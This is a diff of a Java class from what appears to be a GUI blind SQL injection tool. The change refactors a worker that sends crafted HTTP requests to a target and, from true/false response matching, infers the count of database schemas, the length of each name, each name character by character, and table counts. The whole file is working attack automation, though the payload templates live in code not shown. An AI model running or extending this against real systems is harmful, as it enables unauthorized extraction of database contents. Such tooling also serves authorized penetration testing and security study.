@@ -5,6 +5,7 @@ package logic;
 
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Vector;
 import java.util.concurrent.ExecutionException;
 
 import javax.swing.JLabel;
@@ -14,6 +15,8 @@ import javax.swing.table.DefaultTableModel;
 
 import domain.HttpPayload;
 import domain.UserInput;
+import domain.enumeration.QueryType;
+import domain.enumeration.TargetType;
 import ui.BlindSQLInjectionResultUI;
 
 /**
@@ -40,12 +43,7 @@ public class BlindSQLInjectionManager{
 	
 	/** print variables **/
 	private int requestCount = 0;
-	private int dbCount = 0;
-	List<Integer> dbLengths = new ArrayList<Integer>();
 	
-	/**
-	 * 
-	 */
 	public BlindSQLInjectionManager() {
 		decider = new SuccessDecider();
 		HttpHelper = new HttpHelper();
@@ -64,145 +62,139 @@ public class BlindSQLInjectionManager{
 		this.logArea = logArea;
 	}
 	
-	public void getDBCount(UserInput input) {
-		cntWork(input, input.getCountUntil(), "DB Count");
-	}
-	
-	/**
-	 * @Method 	: getDBNameLengths
-	 * @brief	: DB명의 길이를 리턴한다. 
-	 * @author	: Jae-Woong Moon(mjw8585@gmail.com)
-	 * @Date	: 2017/09/05
-	 * @param input
-	 * @param dbCount : DB스키마의 개수(getDBCount 메서드의 실행결과)
-	 * @return
-	 */
-	public List<Integer> getDBNameLengths(UserInput input, int dbCount) {
-		List<Integer> dbLengths = new ArrayList<Integer>();
-		for (int i=0; i < dbCount; i++){
-			getDBNameLength(input, i);
-			//dbLengths.add(dbNameLength);
-		}
-		return dbLengths;
-	}
-	
-	private void getDBNameLength(UserInput input, int dbIndex){
-		//System.out.println("target dbIndex : " + dbIndex);
-		UserInput newParam = input.copy(input);
-		newParam.setDbIndex(dbIndex);
-		cntWork(newParam, newParam.getLengthUntil(), "DB Name Length");
-	}
-	
-	private void cntWork(UserInput input, int until, String workName){
-		
-		SwingWorker<Integer, Integer> worker = new SwingWorker<Integer, Integer>(){
-			@Override
-			protected Integer doInBackground() throws Exception {
-				System.out.println("# doBackground : dbIndex : " + input.getDbIndex());
-				int cnt = 0;
-				//input.setDbIndex(dbIndex);
-				
-				for(int i=0; i < until; i++){
-					publish(i);
-					input.setCheckVal(i+"");
-					//requestCount ++;
-					HttpPayload payload = factory.getHttpPayload(input);
-					String res = HttpHelper.send(payload);
-					if(decider.isSuccess(res, input.getMatch())){
-						cnt = i;
-						break;
-					}
-				}
-				return cnt;
-			}
-
-			@Override
-			protected void process(List<Integer> chunks) {
-				requestCount ++;
-				System.out.println("req count : " + requestCount);
-				//System.out.println("process...:" + chunks.get(chunks.size() -1)+"");
-				//statusLabel.setText(chunks.get(chunks.size() -1)+"");
-				statusLabel.setText(requestCount+"");
-			}
-			
-			@Override
-			protected void done() {
-				try {
-					int cnt = get();
-					if(cnt > 0){
-						logArea.setText(logArea.getText() + "\n" + workName + " founded : " + cnt);
-						// add to 
-						DefaultTableModel dbTableModel =  resultUI.getDBResultUI().getTableModel();
-						Integer[] row = {input.getDbIndex() , cnt};
-						dbTableModel.addRow(row);
-						
-					}else {
-						
-					}
-				} catch (InterruptedException e) {
-					e.printStackTrace();
-				} catch (ExecutionException e) {
-					e.printStackTrace();
-				}
-				
-			}
-		};
-		worker.execute();
-	}
-	
-	public List<String> getDBNames(UserInput input, int dbCount, List<Integer> dbNameLengths){
-		List<String> dbNames = new ArrayList<String>();
-		for (int i=0; i < dbCount; i++){
-			input.setDbIndex(i); // set dbIndex
-			String dbName = getDBName(input, dbNameLengths.get(i));
-			dbNames.add(dbName);
-		}
-		/*
-		SwingWorker<Boolean, String> worker = new SwingWorker<Boolean, String>(){
+	public void dbSearch(UserInput input){
+		SwingWorker<Boolean, Void> worker = new SwingWorker<Boolean, Void>(){
 			@Override
 			protected Boolean doInBackground() throws Exception {
-				for (int i=0; i < dbCount; i++){
-					input.setDbIndex(i); // set dbIndex
-					String dbName = getDBName(input, dbNameLengths.get(i));
-					dbNames.add(dbName);
-					
-					publish(dbName);
+				input.setTargetType(TargetType.DB_SCHEMA);
+				/* STEP 1. search db count */
+				int dbCount = searchDBCount(input);
+				if(dbCount == 0){
+					return false;
 				}
+				// setting result table
+				DefaultTableModel dbTableModel =  resultUI.getDBResultUI().getTableModel();
+				for (int i=0; i < dbCount; i++){
+					Integer[] row = {i+1};
+					dbTableModel.addRow(row);
+				}
+				
+				/* STEP 2. search db name lengths */
+				List<Integer> dbNameLengths = searchDBNameLength(input, dbCount, dbTableModel);
+				
+				/* STEP 3. search db names */
+				List<String> dbNames = searchDBNames(input, dbCount, dbNameLengths, dbTableModel);
+				/*
+				List<String> dbNames = new ArrayList<String>(); 
+				dbNames.add("STONESOUP");*/
+				
+				/* STEP 4. search table counts */
+				input.setTargetType(TargetType.TABLE);
+				List<Integer> tableCounts = searchTableCounts(input, dbNames, dbTableModel);
+				
 				return true;
-			}
-			
-			@Override
-			protected void process(List<String> chunks) {
-				statusLabel.setText(chunks.get(chunks.size() -1));
 			}
 		};
 		worker.execute();
-		*/
+	}
+
+	/** DB **/
+	private int searchDBCount(UserInput input){
+		input.setQueryType(QueryType.COUNT);
+		return cntWork(input, input.getCountUntil());
+	}
+	
+
+	
+	private List<Integer> searchDBNameLength(UserInput input, int dbCount, DefaultTableModel updateTo){
+		List<Integer> result = new ArrayList<Integer>();
+		input.setQueryType(QueryType.LENGTH);
+		
+		for (int i=0; i < dbCount; i++){
+			input.setDbIndex(i);
+			int length = cntWork(input,input.getLengthUntil());
+			result.add(length);
+			updateTo.setValueAt(length, i, 1); // update GUI
+			updateTo.fireTableDataChanged();
+		}
+		return result;
+	}
+	
+	public List<String> searchDBNames(UserInput input, int dbCount, List<Integer> dbNameLengths, DefaultTableModel updateTo){
+		List<String> dbNames = new ArrayList<String>();
+		input.setQueryType(QueryType.CONTENT);
+		
+		for (int i=0; i < dbCount; i++){
+			input.setDbIndex(i); 
+			String dbName = searchDBName(input, dbNameLengths.get(i));
+			dbNames.add(dbName);
+			updateTo.setValueAt(dbName, i, 2);
+			updateTo.fireTableDataChanged();
+		}
 		return dbNames;
 	}
 	
-	private String getDBName(UserInput input, int dbNameLength){
-		int targetContentLength = dbNameLength;
+	private String searchDBName(UserInput input, int dbNameLength){
 		String content = "";
-		for(int i=0; i < targetContentLength ; i++){
-			for(int j=33; j < 127; j++){ //(search ascii 33~126)
-				input.setDbNameIndex(i+1);  //이 것을 X테이블이나 칼럼일 경우 어떻게 할 것인지...
-				input.setCheckVal("char("+j+")");
-				HttpPayload payload = factory.getHttpPayload(input);
-				String res = HttpHelper.send(payload);
-				
-				if(decider.isSuccess(res, input.getMatch())){
-					//System.out.println("find !! at : " + j);
-					String ascii = Character.toString((char)j);
-					content += ascii;
-					break;
-				}
-			}
+		for(int i=0; i < dbNameLength ; i++){
+			input.setDbNameIndex(i+1); 
+			content += contentWork(input);
 		}
 		return content;
 	}
 	
-	// table
-	//public int getTableCount(UserInput input);
+
 	
+	/** Tables **/
+	private List<Integer> searchTableCounts(UserInput input, List<String> dbNames, DefaultTableModel updateTo){
+		List<Integer> tableCounts = new ArrayList<Integer>();
+		input.setQueryType(QueryType.COUNT);
+		for(int i=0; i < dbNames.size(); i++){
+			int tableCount = searchTableCount(input, dbNames.get(i));
+			updateTo.setValueAt(tableCount, i, 3);
+			updateTo.fireTableDataChanged();
+		}
+		return tableCounts;
+	}
+	
+	private int searchTableCount(UserInput input, String dbName){
+		int tableCount = 0;
+		input.setDbName(dbName);
+		tableCount = cntWork(input, input.getCountUntil());
+		return tableCount;
+	}
+	
+	
+	/** common **/
+	private int cntWork(UserInput input, int until){
+		int cnt = 0;
+		for(int i=0; i < until; i++){
+			requestCount++;
+			statusLabel.setText(requestCount+""); //update status label
+			input.setCheckVal(i+"");
+			HttpPayload payload = factory.getHttpPayload(input);
+			String res = HttpHelper.send(payload);
+			if(decider.isSuccess(res, input.getMatch())){
+				cnt = i;
+				break;
+			}
+		}
+		return cnt;
+	}
+	
+	private String contentWork(UserInput input){
+		String ascii = "";
+		for(int j=33; j < 127; j++){ //(search ascii 33~126)
+			requestCount++;
+			statusLabel.setText(requestCount+""); //update status label
+			input.setCheckVal("char("+j+")");
+			HttpPayload payload = factory.getHttpPayload(input);
+			String res = HttpHelper.send(payload);
+			if(decider.isSuccess(res, input.getMatch())){
+				ascii = Character.toString((char)j);
+				break;
+			}
+		}
+		return ascii;
+	}
 }
